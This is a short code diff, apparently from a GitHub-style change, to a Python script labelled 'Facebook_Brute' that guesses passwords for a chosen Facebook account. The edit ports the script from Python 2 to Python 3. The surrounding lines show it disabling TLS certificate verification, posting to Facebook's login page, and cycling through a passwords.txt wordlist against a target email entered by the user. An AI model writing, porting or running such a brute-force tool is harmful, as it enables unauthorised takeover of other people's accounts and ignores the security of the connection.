@@ -2,13 +2,6 @@ import time
 import sys
 import ssl
 
-if sys.version_info[0] != 2:
-    print('''--------------------------------------
-    REQUIRED PYTHON 2.x
-    use: python fb2.py
---------------------------------------
-            ''')
-
 ssl._create_default_https_context = ssl._create_unverified_context
 post_url = 'https://www.facebook.com/login.php'
 headers = {
@@ -27,7 +20,7 @@ except ImportError:
 print('\n-----v1.1.3-----Welcome To Facebook_Brute-----Coded:Vicky-----\n')
 file = open('passwords.txt', 'r')
 
-email = raw_input('Enter Email/Username: ').strip()
+email = input('Enter Email/Username: ').strip()
 
 print("\nTarget Email ID:", email)
 print("\nTrying Passwords from the list...")
